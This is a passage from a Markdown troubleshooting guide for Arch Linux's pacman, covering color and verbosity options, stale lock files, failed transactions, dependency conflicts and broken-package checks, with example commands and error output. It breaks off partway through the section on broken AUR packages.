sudo pacman -Syu --debug 2>&1 | tee full-debug.log
```

#### User-Friendly Interactive

**For daily use (recommended):**

```
# /etc/pacman.conf
[options]
Color
VerbosePkgLists
```

Provides clear, readable output with full information.

### Easter Egg: ILoveCandy

#### Pac-Man Progress Bar

Enable the Pac-Man animation for progress bars:

```
# /etc/pacman.conf
[options]
ILoveCandy
```

**Effect:** Progress bars display a Pac-Man character eating dots instead of standard hash marks.

**Standard progress bar:**
```
[################------] 75%
```

**ILoveCandy progress bar:**
```
[o o o o o o o C------] 75%
```

The 'C' represents Pac-Man eating the 'o' dots as the download progresses.

**Note:** This is a fun visual enhancement with no functional impact.

### Accessibility Considerations

#### High Contrast

For users with visual impairments, colors may help or hinder:

**Enable colors:** Provides visual distinction between elements.

**Disable colors:** Reduces visual complexity; relies on text only.

Test both configurations to determine what works best.

#### Screen Readers

For screen reader users:

**Disable progress bars:**
```
NoProgressBar
```

Progress bars create excessive noise for screen readers.

**Use quiet mode:**
```
pacman -Qq
```

Reduces verbose output to essential information.

### Best Practices

**Enable Color for interactive use:** Improves readability and error visibility.

**Disable color for logging:** Prevents ANSI codes in log files.

**Use VerbosePkgLists:** Provides helpful information before proceeding.

**Enable debug mode for troubleshooting:** Captures comprehensive diagnostic information.

**Use quiet mode in scripts:** Simplifies parsing and reduces noise.

**Combine flags appropriately:** Match verbosity to task requirements.

**Document non-standard settings:** Note why you've changed default verbosity.

**Test before automating:** Verify output format meets scripting needs.

**Consider remote sessions:** Disable progress bars for better performance over slow connections.

**Accessibility first:** Configure for user needs, not just aesthetics.

### Example Configurations

#### Developer/Power User

```
# /etc/pacman.conf
[options]
Color
VerbosePkgLists
ILoveCandy
```

#### Server/Automation

```
# /etc/pacman.conf
[options]
#Color
NoProgressBar
```

#### Standard Desktop User

```
# /etc/pacman.conf
[options]
Color
VerbosePkgLists
```

#### Minimal/Embedded System

```
# /etc/pacman.conf
[options]
#Color
NoProgressBar
#VerbosePkgLists
```

Proper configuration of color and verbosity settings creates an optimal user experience tailored to specific use cases, whether interactive use, automation, or accessibility requirements.

# Common Issues

## Lock File Handling

### Overview

Pacman uses a lock file to prevent multiple instances from running simultaneously and corrupting the package database. Understanding lock file behavior is essential for troubleshooting and safe database management.

### Lock File Location

The lock file is located at:

```
/var/lib/pacman/db.lck
```

This file is created when pacman starts and removed when it exits normally.

### How Lock Files Work

#### Normal Operation Cycle

**1. Pacman starts:**
```
sudo pacman -Syu
```

**2. Lock file created:**
```
touch /var/lib/pacman/db.lck
```

**3. Pacman performs operations:**
- Database queries
- Package downloads
- File installations
- Database updates

**4. Pacman exits normally:**
```
rm /var/lib/pacman/db.lck
```

**5. Lock file removed:**
Lock is released; next pacman instance can run.

#### Lock File Purpose

**Prevents concurrent access:**
- Only one pacman instance can modify the database
- Prevents database corruption from simultaneous writes
- Ensures transaction atomicity

**Protects operations:**
- Package installations
- Database modifications
- File system changes

### Lock File Errors

#### Common Error Message

```
error: failed to init transaction (unable to lock database)
error: could not lock database: File exists
  if you're sure a package manager is not already running, you can remove /var/lib/pacman/db.lck
```

This indicates the lock file exists, preventing pacman from running.

### Causes of Stale Lock Files

#### Improper Termination

**Force quit (Ctrl+C):**
```
sudo pacman -Syu
^C  # Interrupted
```

The lock file may remain if pacman is terminated before cleanup.

**System crash:**
- Power failure during pacman operation
- Kernel panic
- Forced reboot

Lock file persists after unclean shutdown.

**Process kill:**
```
sudo killall pacman
sudo kill -9 $(pidof pacman)
```

Forcefully killed processes don't clean up lock files.

#### Multiple Pacman Instances

**Accidental parallel execution:**
```
Terminal 1: sudo pacman -Syu
Terminal 2: sudo pacman -S package  # Blocked by lock
```

The second instance sees the lock and reports an error.

### Checking for Running Pacman Processes

#### Verify No Pacman is Running

Before removing the lock file, confirm pacman isn't actually running:

**Check for pacman processes:**
```
ps aux | grep pacman
```

**Output if running:**
```
root      1234  0.5  0.3  123456  98765 ?  S    10:00   0:01 pacman -Syu
```

**Output if not running (safe to remove lock):**
```
user      5678  0.0  0.0  12345   678 pts/0 S+   10:05   0:00 grep pacman
```

Only the grep command itself appears.

**Alternative check:**
```
pgrep pacman
```

Returns process ID if pacman is running; no output if not running.

**Check with pidof:**
```
pidof pacman
```

Returns process ID or nothing.

### Safely Removing Lock Files

#### Step-by-Step Safe Removal

**1. Verify no pacman is running:**
```
ps aux | grep pacman
pgrep pacman
```

**2. If no processes found, remove lock:**
```
sudo rm /var/lib/pacman/db.lck
```

**3. Retry pacman operation:**
```
sudo pacman -Syu
```

#### One-Line Safe Check and Remove

```bash
if ! pgrep -x pacman > /dev/null; then
    sudo rm /var/lib/pacman/db.lck
else
    echo "Pacman is running. Do not remove lock file."
fi
```

### When NOT to Remove Lock Files

#### Active Pacman Process

**Never remove the lock if pacman is actually running:**
- Check process list thoroughly
- Look for related processes (pacman, makepkg, AUR helpers)
- Consider background updates or timers

**Consequences of improper removal:**
- Database corruption
- Incomplete package installations
- Broken dependency tracking
- System instability

#### Background Update Services

**Check for automatic updates:**

**Systemd timers:**
```
systemctl list-timers
```

Look for update-related timers that may be running pacman.

**Cron jobs:**
```
crontab -l
sudo crontab -l
```

Check for scheduled pacman operations.

**AUR helpers:**
Some AUR helpers run background processes:
```
ps aux | grep -E "yay|paru|pikaur"
```

### Handling Persistent Lock Issues

#### Lock File Keeps Reappearing

**Symptoms:**
- Lock file recreates immediately after removal
- Cannot run pacman despite removing lock

**Causes and solutions:**

**1. Background service running pacman:**
```
systemctl list-units --type=service --state=running | grep -i update
```

Stop the service:
```
sudo systemctl stop packagekit.service
```

**2. Mounted filesystem issues:**
```
df -h /var/lib/pacman/
```

Check if filesystem is read-only or has issues.

**3. Permission problems:**
```
ls -la /var/lib/pacman/db.lck
```

Ensure proper ownership:
```
sudo chown root:root /var/lib/pacman/db.lck
```

#### Database Corruption After Lock Issues

If removing lock doesn't help or pacman reports database errors:

**Check database integrity:**
```
sudo pacman -Dk
```

**Refresh databases:**
```
sudo pacman -Syy
```

**Rebuild database if necessary:**
```
sudo pacman -S $(pacman -Qq) --overwrite '*'
```

### Preventing Lock File Issues

#### Proper Pacman Termination

**Allow pacman to finish:**
- Don't interrupt with Ctrl+C during critical operations
- Wait for prompts before canceling
- Use `--noconfirm` carefully in scripts

**Graceful interruption:**
If you must stop pacman, interrupt during safe phases:
- During package list display (before confirmation)
- During download (before installation)

**Avoid interrupting during:**
- Package installation
- Database updates
- Scriptlet execution

#### Clean Shutdown Procedures

**Before system reboot:**
```
# Check for running pacman
pgrep pacman

# If found, wait for completion or safely terminate
sudo systemctl stop packagekit
```

**UPS or power management:**
Configure UPS to allow graceful shutdowns during updates.

#### Use NoConfirm Cautiously

```
sudo pacman -Syu --noconfirm
```

**Risks:**
- Automatic acceptance of all prompts
- Cannot interrupt safely during operation
- May install unwanted packages

**Safe usage:**
- Only in well-tested automation
- With proper error handling
- When monitoring output

### Automated Lock File Management

#### Script with Lock Check

```bash
#!/bin/bash
# Safe pacman wrapper with lock checking

LOCKFILE="/var/lib/pacman/db.lck"

# Check for running pacman
if pgrep -x pacman > /dev/null; then
    echo "Error: pacman is already running"
    exit 1
fi

# Check for stale lock file
if [ -f "$LOCKFILE" ]; then
    echo "Warning: Stale lock file found"
    echo "Removing lock file..."
    sudo rm "$LOCKFILE"
fi

# Run pacman
sudo pacman "$@"
```

#### Systemd Service with Lock Handling

```ini
# /etc/systemd/system/safe-update.service
[Unit]
Description=Safe Pacman Update
After=network-online.target

[Service]
Type=oneshot
ExecStartPre=/bin/bash -c 'while pgrep pacman; do sleep 5; done'
ExecStartPre=/bin/rm -f /var/lib/pacman/db.lck
ExecStart=/usr/bin/pacman -Syu --noconfirm

[Install]
WantedBy=multi-user.target
```

**ExecStartPre:** Waits for any running pacman to finish, then removes stale lock.

### Troubleshooting Lock File Issues

#### Permissions Error

```
error: failed to init transaction (unable to lock database)
error: could not lock database: Permission denied
```

**Solution:**
```
ls -la /var/lib/pacman/
sudo chown -R root:root /var/lib/pacman/
sudo chmod 755 /var/lib/pacman/
```

#### Filesystem Read-Only

```
error: could not lock database: Read-only file system
```

**Check mount status:**
```
mount | grep "on /var"
```

**Remount read-write:**
```
sudo mount -o remount,rw /var
```

#### Disk Full

```
error: could not lock database: No space left on device
```

**Check disk space:**
```
df -h /var/lib/pacman/
```

**Free space:**
```
sudo paccache -rk1
sudo pacman -Scc
```

### Recovery Procedures

#### After Interrupted Installation

**1. Remove lock file:**
```
sudo rm /var/lib/pacman/db.lck
```

**2. Check for partial installations:**
```
sudo pacman -Dk
```

**3. Complete interrupted operation:**
```
sudo pacman -Syu
```

**4. Verify system integrity:**
```
pacman -Qkk
```

#### After System Crash

**1. Boot into system**

**2. Remove lock file:**
```
sudo rm /var/lib/pacman/db.lck
```

**3. Verify database integrity:**
```
sudo pacman -Dk
```

**4. Refresh databases:**
```
sudo pacman -Syy
```

**5. Complete any pending operations:**
```
sudo pacman -Syu
```

### Best Practices

**Check before removing:** Always verify no pacman process is running before removing the lock file.

**Understand the cause:** Determine why the lock file is stale to prevent recurrence.

**Avoid force-killing:** Don't use `kill -9` on pacman unless absolutely necessary.

**Allow completion:** Let pacman finish operations when possible.

**Monitor automated updates:** Ensure only one update mechanism runs at a time.

**Backup database:** Regular backups of `/var/lib/pacman/` enable recovery from corruption.

**Clean shutdowns:** Properly shut down systems to avoid orphaned lock files.

**Script safely:** Include lock file checks in automation scripts.

**Document incidents:** Note when and why lock files required manual removal.

**Test recovery procedures:** Understand recovery steps before emergencies occur.

Proper lock file handling ensures database integrity and prevents corruption, maintaining a stable and functional package management system.

## Failed Transactions

### Overview

Failed pacman transactions occur when package installations, upgrades, or removals cannot complete successfully. Understanding failure causes and recovery procedures is essential for maintaining a functional Arch Linux system.

### Common Failure Types

#### Transaction Initialization Failures

**Database lock errors:**
```
error: failed to init transaction (unable to lock database)
```

**Cause:** Lock file exists from previous operation or concurrent pacman instance.

**Solution:**
```
sudo rm /var/lib/pacman/db.lck
sudo pacman -Syu
```

**Database not valid:**
```
error: failed to prepare transaction (database is not valid)
```

**Cause:** Corrupted database files.

**Solution:**
```
sudo pacman -Syy
sudo pacman -Dk
```

#### Dependency Conflicts

**Conflicting dependencies:**
```
error: failed to prepare transaction (could not satisfy dependencies)
:: package-a: requires package-b>=1.0
:: package-b: requires package-a<1.0
```

**Cause:** Circular or incompatible dependency requirements.

**Solution:**
```
sudo pacman -Syu  # Update all packages together
```

**Unresolvable dependencies:**
```
error: failed to prepare transaction (could not satisfy dependencies)
:: installing package-a breaks dependency 'old-package' required by package-b
```

**Cause:** Package conflicts with existing installations.

**Solution:**
```
sudo pacman -S package-a package-b  # Update both simultaneously
```

Or:
```
sudo pacman -Rdd package-b  # Remove conflicting package (dangerous)
sudo pacman -S package-a
```

#### File Conflicts

**Conflicting files:**
```
error: failed to commit transaction (conflicting files)
package-name: /usr/bin/program exists in filesystem
Errors occurred, no packages were upgraded.
```

**Cause:** File already exists, owned by another package or untracked.

**Solutions:**

**Check file ownership:**
```
pacman -Qo /usr/bin/program
```

**If owned by another package:**
```
sudo pacman -S --overwrite /usr/bin/program package-name
```

**If untracked:**
```
sudo rm /usr/bin/program
sudo pacman -S package-name
```

**Override all conflicts (use cautiously):**
```
sudo pacman -S --overwrite '*' package-name
```

#### Disk Space Errors

**Insufficient space:**
```
error: failed to commit transaction (not enough free disk space)
error: not enough free disk space
```

**Check available space:**
```
df -h /
df -h /var
```

**Solution:**
```
sudo paccache -rk1        # Clean package cache
sudo pacman -Scc          # Remove all cache
sudo journalctl --vacuum-time=2weeks  # Clean logs
sudo pacman -Rns $(pacman -Qdtq)     # Remove orphans
```

Then retry:
```
sudo pacman -Syu
```

#### Download Failures

**Failed to retrieve file:**
```
error: failed retrieving file 'package.pkg.tar.zst' from mirror.example.com : Operation timed out
error: failed to commit transaction (download library error)
```

**Causes:**
- Network connectivity issues
- Mirror problems
- Timeout settings

**Solutions:**

**Update mirrors:**
```
sudo reflector --latest 20 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

**Refresh databases:**
```
sudo pacman -Syy
```

**Disable timeout:**
```
sudo pacman -Syu --disable-download-timeout
```

**Clean cache and retry:**
```
sudo pacman -Scc
sudo pacman -Syu
```

#### Signature Verification Failures

**Invalid or corrupted package:**
```
error: package-name: signature from "user@archlinux.org" is unknown trust
error: failed to commit transaction (invalid or corrupted package)
```

**Cause:** Outdated keyring or corrupted signatures.

**Solution:**
```
sudo pacman -Sy archlinux-keyring
sudo pacman-key --refresh-keys
sudo pacman -Syu
```

**If persistent:**
```
sudo rm -rf /etc/pacman.d/gnupg
sudo pacman-key --init
sudo pacman-key --populate archlinux
sudo pacman -Syu
```

#### Scriptlet Failures

**Install script errors:**
```
error: command failed to execute correctly
warning: scriptlet failed to complete successfully
```

**Cause:** Pre/post install scripts encountered errors.

**Solutions:**

**Check logs:**
```
journalctl -b | grep -i error
tail -n 50 /var/log/pacman.log
```

**Skip scriptlets (temporary):**
```
sudo pacman -S --noscriptlet package-name
```

**Reinstall package:**
```
sudo pacman -S package-name
```

### Interrupted Transactions

#### Mid-Transaction Interruption

**Symptoms:**
- Ctrl+C during installation
- System crash during upgrade
- Network disconnection during download

**Recovery steps:**

**1. Remove lock file:**
```
sudo rm /var/lib/pacman/db.lck
```

**2. Check for partial installations:**
```
sudo pacman -Dk
```

**3. Clear potentially corrupted cache:**
```
sudo pacman -Scc
```

**4. Complete the transaction:**
```
sudo pacman -Syu
```

**5. Verify integrity:**
```
pacman -Qkk
```

#### Partial Package Installation

**Package extracted but not registered:**

**Symptoms:**
- Files exist on filesystem
- Package not in database
- Dependency errors

**Solution:**
```
sudo pacman -S --overwrite '*' package-name
```

This reinstalls and properly registers the package.

### Transaction Rollback

#### Pacman Does Not Support Rollback

Unlike some package managers, pacman **does not** automatically rollback failed transactions. Manual intervention is required.

#### Manual Rollback Procedures

**After failed upgrade:**

**1. Identify failed packages:**
```
grep "error:" /var/log/pacman.log | tail -20
```

**2. Downgrade from cache:**
```
sudo pacman -U /var/cache/pacman/pkg/package-old-version.pkg.tar.zst
```

**3. Hold problematic packages:**
```
# Add to /etc/pacman.conf
IgnorePkg = problematic-package
```

**4. Report issue and wait for fix**

### Database Corruption Recovery

#### Symptoms

```
error: could not open file /var/lib/pacman/local/package/desc
error: failed to prepare transaction (database is not valid)
```

#### Recovery Procedures

**1. Check database integrity:**
```
sudo pacman -Dk
```

**2. Refresh sync databases:**
```
sudo pacman -Syy
```

**3. Reinstall corrupted package:**
```
sudo pacman -S package-name --overwrite '*'
```

**4. If widespread corruption, rebuild database:**
```
sudo pacman -S $(pacman -Qq) --overwrite '*'
```

**Warning:** This reinstalls all packages and takes significant time.

### Network-Related Failures

#### Timeout Issues

**Symptoms:**
```
error: failed retrieving file: Operation timed out after 10000 milliseconds
```

**Solutions:**

**Disable timeout:**
```
sudo pacman -Syu --disable-download-timeout
```

**Configure XferCommand with longer timeout:**
```
# /etc/pacman.conf
XferCommand = /usr/bin/curl --connect-timeout 120 -C - -f -o %o %u
```

**Switch mirrors:**
```
sudo reflector --country 'YourCountry' --latest 10 --save /etc/pacman.d/mirrorlist
```

#### SSL/TLS Errors

**Symptoms:**
```
error: failed retrieving file: SSL certificate problem
```

**Solutions:**

**Update ca-certificates:**
```
sudo pacman -S ca-certificates
```

**Check system time:**
```
timedatectl status
sudo timedatectl set-ntp true
```

**Temporarily use HTTP (insecure):**
```
sudo reflector --protocol http --latest 20 --save /etc/pacman.d/mirrorlist
```

### Conflict Resolution Strategies

#### Resolving Package Conflicts

**Multiple packages provide the same file:**

**Example:**
```
:: package-a and package-b are in conflict (both provide /usr/bin/tool)
```

**Solution:**
```
sudo pacman -S package-a
:: package-a and package-b are in conflict. Remove package-b? [y/N] y
```

Allow pacman to remove the conflicting package.

#### Dependency Loop Breaking

**Circular dependencies:**

**Symptoms:**
```
error: failed to prepare transaction (could not satisfy dependencies)
:: package-a: requires package-b
:: package-b: requires package-a
```

**Solution:**
```
sudo pacman -S package-a package-b --overwrite '*'
```

Install both simultaneously.

### Emergency Recovery

#### Broken Pacman

If pacman itself is broken:

**Using pacman-static:**
```
wget https://pkgbuild.com/~morganamilo/pacman-static/x86_64/bin/pacman-static
chmod +x pacman-static
sudo ./pacman-static -Syu pacman
```

#### Chroot Recovery

For systems that won't boot:

**1. Boot from Arch installation media**

**2. Mount system:**
```
mount /dev/sdXn /mnt
mount /dev/sdXn /mnt/boot  # If separate boot partition
```

**3. Chroot:**
```
arch-chroot /mnt
```

**4. Fix pacman issues:**
```
rm /var/lib/pacman/db.lck
pacman -Syu
```

**5. Exit and reboot:**
```
exit
reboot
```

### Preventive Measures

#### Pre-Transaction Checks

**Before major upgrades:**

**1. Read Arch news:**
```
https://archlinux.org/news/
```

**2. Check available space:**
```
df -h /
```

**3. Update keyring first:**
```
sudo pacman -Sy archlinux-keyring
```

**4. Backup critical **
```
sudo rsync -av /etc /backup/etc-$(date +%Y%m%d)
```

**5. Have rescue media ready:**
Keep Arch installation USB accessible.

#### Safe Update Practices

**Update regularly:** Frequent small updates are safer than infrequent large ones.

**Avoid partial upgrades:** Always use `pacman -Syu`, never `pacman -Sy package-name`.

**Test on non-critical systems:** Test updates on development machines first.

**Monitor during updates:** Watch for warnings and errors during transactions.

**Keep cache:** Maintain package cache for downgrade capability.

### Logging and Diagnostics

#### Check Transaction Logs

**Recent pacman operations:**
```
tail -n 100 /var/log/pacman.log
```

**Failed transactions:**
```
grep "error:" /var/log/pacman.log
```

**Last transaction:**
```
grep "starting full system upgrade" /var/log/pacman.log | tail -1
```

**Today's operations:**
```
grep "$(date +%Y-%m-%d)" /var/log/pacman.log
```

#### System Journal

**Pacman-related errors:**
```
journalctl -u pacman.service -b
journalctl | grep -i pacman | tail -50
```

**Boot errors after failed upgrade:**
```
journalctl -b -p err
```

### Best Practices

**Read error messages carefully:** Errors often indicate the exact solution.

**Check news before updating:** Manual intervention announcements prevent failures.

**Maintain adequate disk space:** Keep 20-30% free on root partition.

**Update keyring regularly:** Old keyrings cause signature failures.

**Use reliable mirrors:** Fast, stable mirrors prevent download failures.

**Don't force solutions:** Understand why a failure occurred before overriding.

**Document recovery steps:** Keep notes on how you resolved issues.

**Test recovery procedures:** Understand recovery before emergencies.

**Backup before major changes:** System snapshots enable easy rollback.

**Report bugs:** Help improve Arch by reporting reproducible failures.

Proper handling of failed transactions minimizes system downtime and prevents cascading issues that could require complete reinstallation

## Dependency Conflicts

### Overview

Dependency conflicts occur when package relationships cannot be satisfied simultaneously. Understanding and resolving these conflicts is crucial for maintaining a functional Arch Linux system, especially given its rolling-release nature.

### Types of Dependency Conflicts

#### Unresolvable Dependencies

**Missing package:**
```
error: failed to prepare transaction (could not satisfy dependencies)
:: installing package-a (1.0-1) breaks dependency 'lib-old' required by package-b
```

**Cause:** Package requires a specific version or library that conflicts with other requirements.

#### Version Conflicts

**Incompatible versions:**
```
error: failed to prepare transaction (could not satisfy dependencies)
:: package-a: requires lib>=2.0
:: package-b: requires lib<2.0
```

**Cause:** Two packages need incompatible versions of the same dependency.

#### Circular Dependencies

**Mutual requirements:**
```
error: failed to prepare transaction (could not satisfy dependencies)
:: package-a: requires package-b
:: package-b: requires package-a
```

**Cause:** Packages depend on each other, creating a chicken-and-egg problem.

#### Provider Conflicts

**Multiple providers:**
```
:: There are 2 providers available for dependency-name:
:: Repository extra
   1) provider-a  2) provider-b

Enter a number (default=1):
```

**Cause:** Multiple packages can satisfy a virtual dependency.

### Common Dependency Scenarios

#### Broken Dependencies After Partial Upgrade

**Symptom:**
```
error: failed to prepare transaction (could not satisfy dependencies)
:: package: requires glibc=2.38 but 2.39 is to be installed
```

**Cause:** Partial upgrade (`pacman -Sy package-name` instead of `pacman -Syu`).

**Solution:**
```
sudo pacman -Syu
```

Always perform full system upgrades. Partial upgrades are **unsupported** on Arch Linux.

#### AUR Package Dependency Conflicts

**Symptom:**
```
error: package: requires python<3.12
```

**Cause:** AUR package not updated for newer system libraries.

**Solutions:**

**1. Update AUR package:**
```
cd ~/aur-package
git pull
makepkg -si
```

**2. Check AUR comments for fixes:**
Visit the AUR page and check comments for patches or workarounds.

**3. Modify PKGBUILD:**
Update dependency versions in the PKGBUILD if safe.

**4. Downgrade system package temporarily:**
```
sudo pacman -U /var/cache/pacman/pkg/python-3.11.*.pkg.tar.zst
```

Add to IgnorePkg while waiting for AUR package update.

#### Library Version Conflicts

**Symptom:**
```
error: failed to prepare transaction (could not satisfy dependencies)
:: package-new: installing package-new (2.0-1) breaks dependency 'lib<2.0' required by package-old
```

**Cause:** New package version incompatible with old dependents.

**Solution:**

**Update all affected packages:**
```
sudo pacman -S package-new package-old
```

If package-old has a compatible update, both install successfully.

**If no update available:**
```
sudo pacman -Rns package-old  # Remove old package
sudo pacman -S package-new    # Install new package
```

### Resolving Dependency Conflicts

#### Strategy 1: Full System Upgrade

**Always try this first:**
```
sudo pacman -Syu
```

Most dependency conflicts resolve when all packages update together.

#### Strategy 2: Install Conflicting Packages Together

**Simultaneous installation:**
```
sudo pacman -S package-a package-b package-c
```

Installing multiple packages in one transaction allows pacman to resolve dependencies collectively.

#### Strategy 3: Remove Blocking Packages

**Identify blocking package:**
```
error: failed to prepare transaction (could not satisfy dependencies)
:: installing package-new breaks dependency 'old-lib' required by blocking-package
```

**Remove blocker:**
```
sudo pacman -Rns blocking-package
sudo pacman -S package-new
```

**Reinstall compatible version:**
```
sudo pacman -S blocking-package-new
```

#### Strategy 4: Use --overwrite for File Conflicts

**When files conflict during dependency resolution:**
```
sudo pacman -S --overwrite /path/to/conflicting/file package-name
```

**For widespread conflicts:**
```
sudo pacman -S --overwrite '*' package-name
```

**Warning:** Use sparingly; understand what you're overwriting.

#### Strategy 5: Skip Dependency Checks (Dangerous)

**Single dependency level skip:**
```
sudo pacman -Sd package-name
```

**Skip all dependency checks:**
```
sudo pacman -Sdd package-name
```

**Warning:** This can break your system. Only use when you fully understand the implications and have a recovery plan.

### Handling Circular Dependencies

#### Simultaneous Installation

**Install both packages together:**
```
sudo pacman -S package-a package-b
```

Pacman resolves circular dependencies when packages install in the same transaction.

#### Build Order Issues

**For AUR packages with circular deps:**

**1. Install one with --nodeps:**
```
makepkg -si --nodeps
```

**2. Install the other normally:**
```
makepkg -si
```

**3. Reinstall the first to satisfy deps:**
```
makepkg -sif
```

### Provider Selection

#### Choosing Between Providers

**Multiple providers available:**
```
:: There are 3 providers available for java-runtime:
:: Repository extra
   1) jre-openjdk  2) jre11-openjdk  3) jre8-openjdk

Enter a number (default=1):
```

**Selection strategies:**

**Default option:** Press Enter to accept default (usually most current version).

**Specific version:** Enter number for required version (check dependent package requirements).

**Research-based:** Check package descriptions and dependencies before selecting:
```
pacman -Si jre-openjdk
pacman -Si jre11-openjdk
```

#### Setting Default Providers

**Avoid repeated prompts:**

Install the preferred provider first:
```
sudo pacman -S jre-openjdk
```

Future packages requiring `java-runtime` use the already-installed provider.

### Dependency Trees and Analysis

#### Viewing Dependency Trees

**Show package dependencies:**
```
pactree package-name
```

**Show reverse dependencies:**
```
pactree -r package-name
```

This shows which packages depend on the specified package.

**Install pactree:**
```
sudo pacman -S pacman-contrib
```

#### Analyzing Conflicts

**Check why a package is needed:**
```
pacman -Qi package-name | grep "Required By"
```

**Find optional dependencies:**
```
pacman -Qi package-name | grep "Optional For"
```

**Determine if safe to remove:**
```
pactree -r package-name
```

If no packages depend on it, removal is safe.

### Common Conflict Patterns

#### Python Version Conflicts

**Symptom:**
```
package-name: requires python<3.12
```

**Common with:** AUR packages, older Python applications

**Solutions:**

**1. Update package:**
Check for newer version or AUR comments for Python 3.12 compatibility.

**2. Use virtual environments:**
```
python -m venv venv
source venv/bin/activate
pip install package
```

**3. Downgrade Python temporarily:**
```
sudo pacman -U /var/cache/pacman/pkg/python-3.11.*.pkg.tar.zst
```

Add to IgnorePkg until package updates.

#### Qt/KDE Library Conflicts

**Symptom:**
```
package: requires qt5-base=5.15.10
```

**Cause:** Qt libraries frequently update; dependent packages lag.

**Solution:**

**Full KDE/Qt update:**
```
sudo pacman -S $(pacman -Qsq qt5) $(pacman -Qsq qt6)
```

Updates all Qt-related packages together.

#### GTK Version Conflicts

**Mixing GTK3 and GTK4:**
```
package-new: requires gtk4
package-old: requires gtk3
```

**Solution:**
Both can coexist. Install both GTK versions:
```
sudo pacman -S gtk3 gtk4
```

#### Library Soname Changes

**Symptom:**
```
error: package: requires libfoo.so.5
```

**Cause:** Library major version changed (libfoo.so.5 → libfoo.so.6).

**Solution:**

**Update all dependents:**
```
sudo pacman -Syu
```

**Rebuild AUR packages:**
```
yay -S package-name --rebuild
paru -S package-name --rebuild
```

### Breaking Dependency Chains

#### Using -Rdd (Remove Without Deps)

**Remove package ignoring dependencies:**
```
sudo pacman -Rdd package-name
```

**Warning:** This breaks dependent packages. Only use when:
- You plan to immediately reinstall compatible version
- You're removing the dependent packages too
- You fully understand the consequences

**Safer alternative with cascade:**
```
sudo pacman -Rc package-name
```

This removes the package and all dependents (prompts for confirmation).

#### Temporary Dependency Satisfaction

**Trick pacman into thinking dependency is satisfied:**
```
sudo pacman -S --assume-installed dependency=version package-name
```

**Example:**
```
sudo pacman -S --assume-installed python=3.11 package-requiring-old-python
```

**Warning:** This doesn't actually install the dependency; use only when you know it's truly satisfied another way.

### Recovery from Broken Dependencies

#### Identifying Broken Packages

**Check for broken dependencies:**
```
pacman -Qk
```

**More thorough check:**
```
pacman -Qkk
```

**Using paccheck:**
```
sudo pacman -S pacutils
paccheck --depends
```

#### Rebuilding Dependency Information

**Reinstall package to fix meta**
```
sudo pacman -S package-name
```

**Force database update only:**
```
sudo pacman -S --dbonly package-name
```

### Preventive Measures

#### Best Practices to Avoid Conflicts

**Never do partial upgrades:**
```
# Bad: pacman -Sy package-name
# Good: pacman -Syu
```

**Update regularly:** Frequent updates prevent large dependency gaps.

**Read Arch news:** Manual intervention notices explain major dependency changes.

**Update AUR packages:** Rebuild AUR packages after system library updates:
```
yay -Syu --devel
paru -Syu --devel
```

**Maintain clean system:** Remove orphaned packages:
```
sudo pacman -Rns $(pacman -Qdtq)
```

**Check before installing:** Review dependencies before committing:
```
pacman -Si package-name | grep Depends
```

### When to Seek Help

#### Documentation Resources

**Arch Wiki:**
```
https://wiki.archlinux.org/
```

Search for specific packages or error messages.

**Arch Forums:**
```
https://bbs.archlinux.org/
```

Search for similar issues or post new questions.

**AUR Package Comments:**
Check AUR page comments for known dependency issues and solutions.

#### Reporting Issues

**Check if it's a known issue:**
```
https://bugs.archlinux.org/
```

**Gather diagnostic information:**
```
pacman -Si package-name
pacman -Qi package-name
pactree package-name
pactree -r package-name
```

Include this information when reporting or asking for help.

### Best Practices

**Understand before acting:** Research why conflicts occur before forcing solutions.

**Full system upgrades:** Always use `pacman -Syu`, never partial upgrades.

**Read error messages:** Pacman clearly explains what's wrong; read carefully.

**Check dependency trees:** Use `pactree` to understand package relationships.

**Avoid --nodeps:** Skipping dependency checks creates problems.

**Update together:** Install conflicting packages in single transaction.

**Remove cleanly:** Use `-Rns` to remove packages with dependencies and configs.

**Monitor AUR packages:** Rebuild after system library updates.

**Keep backups:** Snapshot system before major dependency changes.

**Ask for help:** Don't guess; seek assistance when unsure.

Proper dependency conflict resolution maintains system stability and prevents cascading failures that could render

## Broken Packages

### Overview

Broken packages are packages that fail to function correctly due to missing files, corrupted data, unsatisfied dependencies, or installation errors. Identifying and repairing broken packages is essential for maintaining a stable Arch Linux system.

### Identifying Broken Packages

#### File Integrity Checks

**Basic file presence check:**
```
pacman -Qk
```

Shows packages with missing files.

**Comprehensive integrity check:**
```
pacman -Qkk
```

Checks file presence, sizes, permissions, and modification times.

**Output interpretation:**
```
warning: package-name: /usr/bin/program (Size mismatch)
warning: package-name: /etc/config (Modification time mismatch)
```

#### Advanced Checking with paccheck

**Install pacutils:**
```
sudo pacman -S pacutils
```

**Check dependencies:**
```
paccheck --depends
```

Reports packages with unsatisfied dependencies.

**Check file integrity:**
```
paccheck --file-properties
```

Verifies file ownership, permissions, and types.

**Check checksums:**
```
paccheck --sha256sum
```

Validates file content integrity using checksums.

**Comprehensive check:**
```
paccheck --depends --file-properties --sha256sum --quiet
```

Shows only packages with issues.

#### Dependency Verification

**Check for broken dependencies:**
```
pacman -Dk
```

Verifies database consistency.

**Find packages with missing dependencies:**
```
pactree -d1 package-name
```

Shows direct dependencies; errors indicate broken deps.

### Common Causes of Broken Packages

#### Interrupted Installations

**Symptoms:**
- Ctrl+C during package installation
- System crash during upgrade
- Power failure mid-transaction

**Results:**
- Partially extracted files
- Incomplete database entries
- Missing executables or libraries

**Solution:**
```
sudo pacman -S package-name --overwrite '*'
```

Reinstalls and completes the installation.

#### Filesystem Corruption

**Symptoms:**
- Corrupted files after disk errors
- Bad sectors causing data loss
- Filesystem inconsistencies

**Detection:**
```
sudo fsck /dev/sdXn  # Run on unmounted partition
```

**Solution:**
Fix filesystem first, then reinstall affected packages:
```
sudo pacman -S $(pacman -Qkk 2>&1 | grep -v "0 altered files" | cut -d: -f1 | sort -u)
```

#### Manual File Modifications

**Symptoms:**
- User edited system files
- Manually deleted package files
- Changed file permissions

**Detection:**
```
pacman -Qkk package-name
```

**Solution:**
Reinstall to restore original files:
```
sudo pacman -S package-name
```

#### Library Incompatibilities

**Symptoms:**
```
error while loading shared libraries: libfoo.so.5: cannot open shared object file
```

**Cause:** Missing or incompatible library after upgrade.

**Detection:**
```
ldd /usr/bin/program
```

Shows missing libraries.

**Solution:**
```
sudo pacman -Syu  # Full system upgrade
```

Or rebuild AUR packages:
```
yay -S package-name --rebuild
```

#### AUR Build Issues

**Symptoms:**
- Package installs but doesn't work
- Missing dependencies not in repos
- Incorrect file paths

**Solution:**
